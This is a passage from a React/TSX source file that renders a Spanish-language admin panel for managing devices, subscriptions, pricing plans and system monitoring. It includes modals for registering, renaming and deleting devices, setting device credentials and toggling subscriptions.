                          <button className="action-btn btn-edit" data-testid={`open-edit-device-${d.device_id}`} onClick={e => { e.stopPropagation(); openEditModal(d); }}>
                            <svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15.232 5.232l3.536 3.536m-2.036-5.036a2.5 2.5 0 113.536 3.536L6.5 21.036H3v-3.572L16.732 3.732z" /></svg>
                            Editar
                          </button>
                          <button className="action-btn btn-reset" data-testid={`reset-creds-${d.device_id}`} onClick={e => { e.stopPropagation(); resetCreds(i); }}>
                            <svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15" /></svg>
                            Regenerar
                          </button>
                          <button className="action-btn btn-delete btn-danger-zone" data-testid={`open-delete-device-${d.device_id}`} onClick={e => { e.stopPropagation(); openDeleteModal(d); }}>
                            <svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16" /></svg>
                            Eliminar
                          </button>
                        </div>
                        </div>
                      </div>
                    </div>
                  );
                })}
              </div>
            )}
          </div>
            </>
          )}

          {adminTab === 'subscriptions' && (
            <div className="device-list" style={{ marginTop: 0 }}>
              {subsLoading ? (
                <div className="loading-spinner" data-testid="subscriptions-loading"><div className="spinner" /></div>
              ) : globalSubs.length === 0 ? (
                <div className="empty-state">
                  <div className="empty-icon">📋</div>
                  <h3>Sin suscripciones registradas</h3>
                </div>
              ) : (
                <div className="device-card expanded">
                  <table className="admin-table">
                    <thead>
                      <tr>
                        <th>Dispositivo</th>
                        <th>Aplicación</th>
                        <th>Estado</th>
                        <th>Vencimiento</th>
                      </tr>
                    </thead>
                    <tbody>
                      {globalSubs.map((s, i) => (
                        <tr key={i}>
                          <td style={{ fontFamily: 'monospace', fontSize: '0.8rem', color: 'rgba(255,255,255,0.7)' }}>{s.device_id}</td>
                          <td style={{ fontWeight: 600 }}>{s.app_name}</td>
                          <td>
                            <span className={`status-badge-sm ${s.active ? 'active' : 'inactive'}`}>
                              {s.active ? 'Activa' : 'Inactiva'}
                            </span>
                          </td>
                          <td style={{ fontSize: '0.8rem', color: 'rgba(255,255,255,0.5)' }}>
                            {s.expires_at ? formatExactDate(s.expires_at) : '-'}
                          </td>
                        </tr>
                      ))}
                    </tbody>
                  </table>
                </div>
              )}
            </div>
          )}

          {adminTab === 'plans' && (
            <div className="device-list" style={{ marginTop: 0 }}>
              {plansLoading ? (
                <div className="loading-spinner" data-testid="plans-loading"><div className="spinner" /></div>
              ) : plans.length === 0 ? (
                <div className="empty-state">
                  <div className="empty-icon">💰</div>
                  <h3>Sin planes configurados</h3>
                </div>
              ) : (
                <div className="device-card expanded">
                  <table className="admin-table">
                    <thead>
                      <tr>
                        <th>App</th>
                        <th>Nombre / Promoción</th>
                        <th>Precio ($)</th>
                        <th>Estado</th>
                        <th>Acción</th>
                      </tr>
                    </thead>
                    <tbody>
                      {plans.map((p, i) => (
                        <tr key={i}>
                          <td style={{ fontWeight: 600 }}>{p.app_name}</td>
                          <td style={{ fontSize: '0.85rem' }}>{p.display_name || p.app_name}</td>
                          <td>
                            <input 
                              type="number" 
                              step="0.01" 
                              min="0"
                              defaultValue={p.price || 0}
                              className="modal-input"
                              style={{ width: '100px', marginBottom: 0, padding: '8px 12px' }}
                              id={`price_input_${p.app_name}`}
                            />
                          </td>
                          <td>
                            <span className={`status-badge-sm ${p.enabled ? 'active' : 'inactive'}`}>
                              {p.enabled ? 'Activo' : 'Inactivo'}
                            </span>
                          </td>
                          <td style={{ display: 'flex', gap: 8 }}>
                            <button
                              className="btn-primary-small"
                              data-testid={`save-plan-price-${p.app_name}`}
                              onClick={() => {
                                const val = (document.getElementById(`price_input_${p.app_name}`) as HTMLInputElement)?.value;
                                savePlanPrice(p.app_name, p.display_name || p.app_name, parseFloat(val || '0'));
                              }}
                            >
                              Guardar
                            </button>
                            <button
                              className="btn-primary-small"
                              data-testid={`toggle-plan-${p.app_name}`}
                              style={{ background: p.enabled ? 'rgba(255, 0, 51, 0.2)' : 'rgba(255, 255, 255, 0.05)', color: p.enabled ? '#ff0033' : '#fff' }}
                              onClick={() => togglePlanState(p.app_name, p.enabled)}
                            >
                              {p.enabled ? 'Desactivar' : 'Activar'}
                            </button>
                          </td>
                        </tr>
                      ))}
                    </tbody>
                  </table>
                </div>
              )}
            </div>
          )}

          {adminTab === 'monitoring' && (
            <div style={{ padding: '0 20px 24px' }}>
              <div className="section-label">
                Métricas del sistema
                <button className="btn-primary-small" data-testid="refresh-metrics" onClick={loadMetrics} disabled={metricsLoading} style={{ marginLeft: 'auto' }}>
                  🔄 Actualizar
                </button>
              </div>

              {metricsLoading ? (
                <div className="loading-spinner"><div className="spinner" /></div>
              ) : !metrics ? (
                <div className="empty-state">
                  <div className="empty-icon">📊</div>
                  <h3>Sin métricas disponibles</h3>
                </div>
              ) : (
                <>
                  <p style={{ fontSize: '0.75rem', color: 'rgba(255,255,255,0.5)', marginBottom: 12 }}>
                    Contadores acumulados desde el arranque del backend ({formatExactDateTime(metrics.since_boot)}). No son promedios ni tasas.
                  </p>
                  <div className="stats-row">
                    <div className="stat-card">
                      <div className="num">{metrics.ingest_total}</div>
                      <div className="label">Ingest total (acum.)</div>
                    </div>
                    <div className="stat-card">
                      <div className="num">{metrics.ingest_errors}</div>
                      <div className="label">Errores ingest (acum.)</div>
                    </div>
                    <div className="stat-card">
                      <div className="num">{metrics.persist_inserts}</div>
                      <div className="label">Inserciones (acum.)</div>
                    </div>
                    <div className="stat-card">
                      <div className="num">{metrics.persist_dedup_skips}</div>
                      <div className="label">Dedup skips (acum.)</div>
                    </div>
                    <div className="stat-card">
                      <div className="num">{metrics.worker_errors}</div>
                      <div className="label">Errores worker (acum.)</div>
                    </div>
                  </div>

                  <p style={{ fontSize: '0.75rem', color: 'rgba(255,255,255,0.5)', margin: '20px 0 12px' }}>
                    Latencia: promedio y p99 sobre las últimas 100 muestras (rolling), no un histórico total.
                  </p>
                  <div className="stats-row">
                    <div className="stat-card">
                      <div className="num">{(metrics.avg_latency_ms ?? 0).toFixed(1)} ms</div>
                      <div className="label">Latencia prom. (últ. 100)</div>
                    </div>
                    <div className="stat-card">
                      <div className="num">{(metrics.p99_latency_ms ?? 0).toFixed(1)} ms</div>
                      <div className="label">Latencia p99 (últ. 100)</div>
                    </div>
                  </div>

                  {Object.keys(metrics.worker_errors_by_device || {}).length > 0 && (
                    <>
                      <div className="section-label" style={{ marginTop: 20 }}>Errores de worker por dispositivo</div>
                      <div className="device-card expanded">
                        <table className="admin-table">
                          <thead>
                            <tr>
                              <th>Dispositivo</th>
                              <th>Errores</th>
                            </tr>
                          </thead>
                          <tbody>
                            {Object.entries(metrics.worker_errors_by_device).map(([deviceId, count]) => (
                              <tr key={deviceId}>
                                <td style={{ fontFamily: 'monospace', fontSize: '0.8rem', color: 'rgba(255,255,255,0.7)' }}>{deviceId}</td>
                                <td>{count}</td>
                              </tr>
                            ))}
                          </tbody>
                        </table>
                      </div>
                    </>
                  )}

                  {metrics.semantics !== undefined && (
                    <details style={{ marginTop: 16 }}>
                      <summary style={{ cursor: 'pointer', fontSize: '0.75rem', color: 'rgba(255,255,255,0.5)' }}>semantics (detalle crudo del backend)</summary>
                      <pre style={{ fontSize: '0.7rem', color: 'rgba(255,255,255,0.6)', background: 'rgba(255,255,255,0.03)', padding: 12, borderRadius: 8, overflowX: 'auto' }}>
                        {JSON.stringify(metrics.semantics, null, 2)}
                      </pre>
                    </details>
                  )}
                </>
              )}

              <div className="section-label" style={{ marginTop: 32 }}>Dispositivos inactivos</div>
              <div style={{ display: 'flex', gap: 8, alignItems: 'center', marginBottom: 16, flexWrap: 'wrap' }}>
                <label className="modal-label" style={{ margin: 0 }}>Umbral (minutos)</label>
                <input
                  type="number"
                  min={1}
                  value={inactiveThreshold}
                  onChange={e => setInactiveThreshold(Number(e.target.value))}
                  data-testid="inactive-threshold-input"
                  className="modal-input"
                  style={{ width: 100, marginBottom: 0 }}
                />
                <button className="btn-primary-small" data-testid="load-inactive-devices" onClick={() => loadInactiveDevices(inactiveThreshold)}>
                  Buscar
                </button>
              </div>
              {inactiveDevices.length === 0 ? (
                <div className="empty-state">
                  <div className="empty-icon">📡</div>
                  <h3>Sin dispositivos inactivos</h3>
                  <p>Todos los dispositivos reportaron actividad dentro del umbral.</p>
                </div>
              ) : (
                <div className="device-card expanded">
                  <table className="admin-table">
                    <thead>
                      <tr>
                        <th>Dispositivo</th>
                        <th>Última actividad</th>
                      </tr>
                    </thead>
                    <tbody>
                      {inactiveDevices.map(d => (
                        <tr key={d.device_id}>
                          <td>{d.name || d.device_id}</td>
                          <td style={{ fontSize: '0.8rem', color: 'rgba(255,255,255,0.5)' }}>{getTimeAgo(d.last_seen ? new Date(d.last_seen) : new Date(NaN))}</td>
                        </tr>
                      ))}
                    </tbody>
                  </table>
                </div>
              )}

              <div className="section-label" style={{ marginTop: 32 }}>Configuración de mantenimiento (solo lectura)</div>
              {maintenanceConfig && (
                <div className="stats-row" style={{ marginBottom: 24 }}>
                  <div className="stat-card">
                    <div className="num">{maintenanceConfig.log_retention_days}</div>
                    <div className="label">Retención logs (días)</div>
                  </div>
                  <div className="stat-card">
                    <div className="num">{maintenanceConfig.nonce_retention_hours}</div>
                    <div className="label">Retención nonces (h)</div>
                  </div>
                  <div className="stat-card">
                    <div className="num">{maintenanceConfig.maintenance_interval_seconds}</div>
                    <div className="label">Intervalo automático (s)</div>
                  </div>
                </div>
              )}

              <div className="section-label" style={{ color: '#ff0033', marginTop: 32 }}>Zona de peligro: purga manual</div>
              <p style={{ fontSize: '0.75rem', color: 'rgba(255,0,51,0.7)', marginBottom: 12 }}>
                Borra permanentemente logs más antiguos que el umbral indicado. Esta acción es irreversible.
              </p>
              <div style={{ display: 'flex', gap: 8, alignItems: 'center', flexWrap: 'wrap' }}>
                <label className="modal-label" style={{ margin: 0 }}>Retención (días)</label>
                <input
                  type="number"
                  min={0}
                  value={purgeRetentionDays}
                  onChange={e => setPurgeRetentionDays(Number(e.target.value))}
                  data-testid="purge-retention-days-input"
                  className="modal-input"
                  style={{ width: 100, marginBottom: 0 }}
                />
                <button
                  className="btn-primary-small btn-danger-zone"
                  data-testid="admin-run-maintenance-purge"
                  onClick={runMaintenancePurge}
                  disabled={isActionLoading}
                  style={{ background: 'rgba(255,0,51,0.2)', color: '#ff0033', borderColor: 'rgba(255,0,51,0.4)' }}
                >
                  ☢️ Ejecutar purga manual
                </button>
              </div>
            </div>
          )}
        </div>

      {/* Modal de Registro de Dispositivo */}
      {showRegisterModal && (
        <div className="modal-overlay" onClick={() => setShowRegisterModal(false)}>
          <div className="modal-content" onClick={e => e.stopPropagation()}>
            <h2 className="modal-title">Registrar Nuevo Dispositivo</h2>
            <div style={{ marginBottom: '16px' }}>
              <label className="modal-label">ID del Dispositivo *</label>
              <input
                type="text"
                value={newDeviceId}
                onChange={(e) => setNewDeviceId(e.target.value)}
                placeholder="ej: device-001"
                className="modal-input"
              />
            </div>
            <div style={{ marginBottom: '24px' }}>
              <label className="modal-label">Nombre (opcional)</label>
              <input
                type="text"
                value={newDeviceName}
                onChange={(e) => setNewDeviceName(e.target.value)}
                placeholder="ej: iPhone de Juan"
                className="modal-input"
              />
            </div>
            <div className="modal-actions">
              <button
                onClick={() => { setShowRegisterModal(false); setNewDeviceId(''); setNewDeviceName(''); }}
                disabled={isActionLoading}
                className="modal-btn modal-btn-cancel"
                data-testid="register-device-cancel"
              >
                Cancelar
              </button>
              <button
                onClick={registerDevice}
                disabled={isActionLoading}
                className="modal-btn modal-btn-primary"
                data-testid="register-device-confirm"
              >
                {isActionLoading ? 'Registrando...' : 'Registrar'}
              </button>
            </div>
          </div>
        </div>
      )}

      {/* Modal de Eliminar Dispositivo */}
      {showDeleteModal && selectedDevice && (
        <div className="modal-overlay" onClick={() => setShowDeleteModal(false)}>
          <div className="modal-content danger" onClick={e => e.stopPropagation()}>
            <div style={{ fontSize: '3rem', textAlign: 'center', marginBottom: '16px' }}>⚠️</div>
            <h2 className="modal-title">Eliminar Dispositivo</h2>
            <p style={{ color: 'rgba(255, 255, 255, 0.8)', fontSize: '0.9rem', marginBottom: '8px', textAlign: 'center', fontFamily: "'Inter', sans-serif" }}>
              ¿Estás seguro de eliminar el dispositivo?
            </p>
            <p style={{ color: '#00f0ff', fontSize: '1rem', marginBottom: '24px', textAlign: 'center', fontFamily: 'monospace', fontWeight: 'bold' }}>
              {selectedDevice.name || selectedDevice.device_id}
            </p>
            <p style={{ color: 'rgba(255, 0, 51, 0.8)', fontSize: '0.85rem', marginBottom: '24px', textAlign: 'center', fontFamily: "'Inter', sans-serif" }}>
              Esta acción no se puede deshacer. El dispositivo perderá acceso al sistema.
            </p>
            <div className="modal-actions">
              <button
                onClick={() => { setShowDeleteModal(false); setSelectedDevice(null); }}
                disabled={isActionLoading}
                className="modal-btn modal-btn-cancel"
                data-testid="delete-device-cancel"
              >
                Cancelar
              </button>
              <button
                onClick={deleteDevice}
                disabled={isActionLoading}
                className="modal-btn modal-btn-danger btn-danger-zone"
                data-testid="delete-device-confirm"
              >
                {isActionLoading ? 'Eliminando...' : 'Eliminar'}
              </button>
            </div>
          </div>
        </div>
      )}

      {/* Modal de Editar Nombre */}
      {showEditModal && selectedDevice && (
        <div className="modal-overlay" onClick={() => setShowEditModal(false)}>
          <div className="modal-content" onClick={e => e.stopPropagation()}>
            <h2 className="modal-title">Editar Nombre</h2>
            <div style={{ marginBottom: '24px' }}>
              <label className="modal-label">Nuevo nombre</label>
              <input
                type="text"
                value={editDeviceName}
                onChange={(e) => setEditDeviceName(e.target.value)}
                placeholder="ej: iPhone de Juan"
                className="modal-input"
              />
            </div>
            <div className="modal-actions">
              <button
                onClick={() => { setShowEditModal(false); setSelectedDevice(null); setEditDeviceName(''); }}
                disabled={isActionLoading}
                className="modal-btn modal-btn-cancel"
                data-testid="edit-device-cancel"
              >
                Cancelar
              </button>
              <button
                onClick={updateDeviceName}
                disabled={isActionLoading}
                className="modal-btn modal-btn-primary"
                data-testid="edit-device-confirm"
              >
                {isActionLoading ? 'Guardando...' : 'Guardar'}
              </button>
            </div>
          </div>
        </div>
      )}

      {/* Modal de Credenciales del dispositivo */}
      {showCredsModal && selectedDevice && (
        <div className="modal-overlay" onClick={() => setShowCredsModal(false)}>
          <div className="modal-content" onClick={e => e.stopPropagation()}>
            <h2 className="modal-title">Credenciales: {selectedDevice.name || selectedDevice.device_id}</h2>
            <p style={{ fontSize: '0.8rem', color: 'rgba(255,255,255,0.5)', marginBottom: '16px' }}>
              Usuario y contraseña para que este dispositivo inicie sesión en el panel.
            </p>
            <div style={{ marginBottom: '16px' }}>
              <label className="modal-label">Usuario</label>
              <input
                type="text"
                value={credsUsername}
                onChange={(e) => setCredsUsername(e.target.value)}
                placeholder="ej: phone-cesar"
                className="modal-input"
                data-testid="creds-username-input"
              />
            </div>
            <div style={{ marginBottom: '24px' }}>
              <label className="modal-label">Contraseña</label>
              <div style={{ display: 'flex', gap: 8 }}>
                <input
                  type="text"
                  value={credsPassword}
                  onChange={(e) => setCredsPassword(e.target.value)}
                  placeholder="Contraseña"
                  className="modal-input"
                  style={{ marginBottom: 0 }}
                  data-testid="creds-password-input"
                />
                <button
                  type="button"
                  className="btn-primary-small"
                  data-testid="creds-generate-password"
                  onClick={() => setCredsPassword(generateCredential())}
                >
                  Generar
                </button>
              </div>
            </div>
            <div className="modal-actions">
              <button
                onClick={() => { setShowCredsModal(false); setSelectedDevice(null); setCredsUsername(''); setCredsPassword(''); }}
                disabled={isActionLoading}
                className="modal-btn modal-btn-cancel"
                data-testid="creds-cancel"
              >
                Cancelar
              </button>
              <button
                onClick={saveCredentials}
                disabled={isActionLoading}
                className="modal-btn modal-btn-primary"
                data-testid="creds-confirm"
              >
                {isActionLoading ? 'Guardando...' : 'Guardar'}
              </button>
            </div>
          </div>
        </div>
      )}

      {/* Modal de Suscripciones */}
      {showSubsModal && selectedDevice && (
        <div className="modal-overlay" onClick={() => setShowSubsModal(false)}>
          <div className="modal-content" style={{ maxWidth: '600px' }} onClick={e => e.stopPropagation()}>
            <h2 className="modal-title">Suscripciones: {selectedDevice.name || selectedDevice.device_id}</h2>
            {deviceSubs.length === 0 ? (
              <p style={{ textAlign: 'center', color: 'rgba(255,255,255,0.5)', padding: '20px' }}>Sin suscripciones</p>
            ) : (
              <table className="admin-table">
                <thead>
                  <tr>
                    <th>App</th>
                    <th>Estado</th>
                    <th>Vencimiento</th>
                    <th>Acción</th>
                  </tr>
                </thead>
                <tbody>
                  {deviceSubs.map((s, i) => (
                    <tr key={i}>
                      <td>{s.display_name || s.app_name}</td>
                      <td>
                        <span className={`status-badge-sm ${s.active ? 'active' : 'inactive'}`}>
                          {s.active ? 'Activa' : 'Inactiva'}
                        </span>
                      </td>
                      <td style={{ fontSize: '0.8rem', color: 'rgba(255,255,255,0.5)' }}>
                        {s.expires_at ? formatExactDate(s.expires_at) : '-'}
                      </td>
                      <td>
                        <button
                          className="btn-primary-small"
                          data-testid={`toggle-subscription-${selectedDevice.device_id}-${s.app_name}`}
                          style={{ background: s.active ? 'rgba(255, 0, 51, 0.2)' : 'rgba(0, 240, 255, 0.2)', color: s.active ? '#ff0033' : '#00f0ff' }}
                          onClick={() => toggleSubscription(s.app_name, !s.active)}
                        >
                          {s.active ? 'Revocar' : 'Otorgar'}
                        </button>
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            )}
            <div className="modal-actions" style={{ marginTop: '24px' }}>
              <button onClick={() => setShowSubsModal(false)} className="modal-btn modal-btn-cancel" data-testid="subscriptions-modal-close">Cerrar</button>
            </div>
          </div>
        </div>
      )}

      <div className="tab-bar">
        <button className="tab-item" data-testid="tab-bar-canales" onClick={() => navigate('/seleccion')}>
          <span className="tab-icon">🛡</span>
          Canales
        </button>
        <button className="tab-item" data-testid="tab-bar-dashboard" onClick={() => navigate('/dashboard')}>
          <span className="tab-icon">👁️</span>
          Dashboard
        </button>
        <button className="tab-item active" data-testid="tab-bar-admin" onClick={() => navigate('/admin')}>
          <span className="tab-icon">⚙️</span>
          Admin
        </button>
      </div>
    </>
  );
}
